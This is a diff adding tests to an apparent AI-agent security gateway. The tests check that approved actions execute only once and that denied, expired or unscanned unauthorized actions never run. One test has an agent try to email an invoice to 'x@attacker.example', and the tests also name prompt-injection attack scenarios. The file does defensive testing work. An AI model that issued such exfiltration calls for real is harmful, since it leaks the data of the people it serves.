@@ -317,3 +317,74 @@ def test_document_guard_agent_run_blocks_injected_and_allows_benign(client):
 def test_document_scan_validation_errors(client):
     r = client.post("/api/v1/document-guard/scan", json={"text": ""})
     assert r.status_code == 422 and r.json()["error"]["code"] == "validation_error"
+
+
+def test_execute_approved_action_server_side_single_use(client):
+    """End-to-end: Attack Lab creates a real approval → approve → server executes once → replay denied."""
+    lab = client.post("/api/v1/attack-lab/run", json={"scenario_ids": ["approval_vendor_email"]}).json()["results"][0]
+    assert lab["final_authorization"] == "pending_approval" and lab["executor_call_count"] == 0
+    aid = lab["approval_id"]
+    assert any(a["approval_id"] == aid for a in client.get("/api/v1/approvals?status=pending").json()["approvals"])
+    assert "action_payload" not in client.get(f"/api/v1/approvals/{aid}").json()
+
+    # Pending approvals cannot be executed
+    early = client.post(f"/api/v1/approvals/{aid}/execute").json()
+    assert early["final_authorization"] == "denied" and early["executor_call_count"] == 0
+
+    client.post(f"/api/v1/approvals/{aid}/decision", json={"decision": "approve"})
+    ok = client.post(f"/api/v1/approvals/{aid}/execute").json()
+    assert ok["final_authorization"] == "allowed" and ok["executor_call_count"] == 1
+    assert ok["executor_calls_after"] == ok["executor_calls_before"] + 1
+    assert client.get(f"/api/v1/approvals/{aid}").json()["status"] == "consumed"
+
+    replay = client.post(f"/api/v1/approvals/{aid}/execute").json()
+    assert replay["final_authorization"] == "denied" and replay["executor_call_count"] == 0
+    assert "consumed" in replay["authorization_reason"]
+    # Both outcomes are persisted events
+    events = {e["event_id"] for e in client.get("/api/v1/events?limit=50").json()["events"]}
+    assert {ok["event_id"], replay["event_id"]} <= events
+    assert client.post("/api/v1/approvals/missing/execute").status_code == 404
+
+
+def test_denied_or_invalid_decision_never_executes(client):
+    lab = client.post("/api/v1/attack-lab/run", json={"scenario_ids": ["approval_vendor_email"]}).json()["results"][0]
+    aid = lab["approval_id"]
+    assert client.post(f"/api/v1/approvals/{aid}/decision", json={"decision": "maybe"}).status_code == 422
+    client.post(f"/api/v1/approvals/{aid}/decision", json={"decision": "deny"})
+    r = client.post(f"/api/v1/approvals/{aid}/execute").json()
+    assert r["final_authorization"] == "denied" and r["executor_call_count"] == 0
+
+
+def test_expired_approval_cannot_execute_via_endpoint(client):
+    lab = client.post("/api/v1/attack-lab/run", json={"scenario_ids": ["approval_vendor_email"]}).json()["results"][0]
+    aid = lab["approval_id"]
+    client.post(f"/api/v1/approvals/{aid}/decision", json={"decision": "approve"})
+    conn = get_connection(client.db_path)
+    conn.execute("UPDATE approvals SET expires_at = ? WHERE approval_id = ?",
+                 ((datetime.now(timezone.utc) - timedelta(seconds=1)).isoformat(), aid))
+    conn.commit(); conn.close()
+    r = client.post(f"/api/v1/approvals/{aid}/execute").json()
+    assert r["final_authorization"] == "denied" and r["executor_call_count"] == 0 and "expired" in r["authorization_reason"]
+
+
+def test_missed_scan_signal_cannot_bypass_gateway(client):
+    """Heuristics are not enforcement: text with no scan findings still can't push an unauthorized action."""
+    assert scan_text("Quarterly totals attached.")["risk_level"] == "no_signals"
+    r = _exec(client, task_id=TASK, agent_id=AGENT, tool_name="send_external_email",
+              arguments={"to": "x@attacker.example", "subject": "s", "body": "b", "attachment": "invoice-42"},
+              resource="invoice-42")
+    assert r["authorization"] == "denied" and r["executor_call_count"] == 0
+
+
+def test_overview_events_and_audit_read_same_persisted_decisions(client):
+    client.post("/api/v1/attack-lab/run", json={"scenario_ids": ["local_summary", "prompt_injection_email"]})
+    ov = client.get("/api/v1/overview").json()
+    events = client.get("/api/v1/events?limit=200").json()["events"]
+    ids = {e["event_id"] for e in events}
+    assert {e["event_id"] for e in ov["recent_events"]} <= ids
+    metric = {m["label"]: m["value"] for m in ov["metrics"]}
+    assert metric["Allowed"] == sum(e["authorization"] == "allowed" for e in events)
+    assert metric["Blocked"] == sum(e["authorization"] == "denied" for e in events)
+    assert ov["last_attack_lab_event"]["event_id"] in ids
+    assert ov["executor_calls_total"] == sum(
+        _count(client.db_path, t) for t in ("read_assigned_invoice", "generate_local_summary", "send_external_email", "delete_file"))
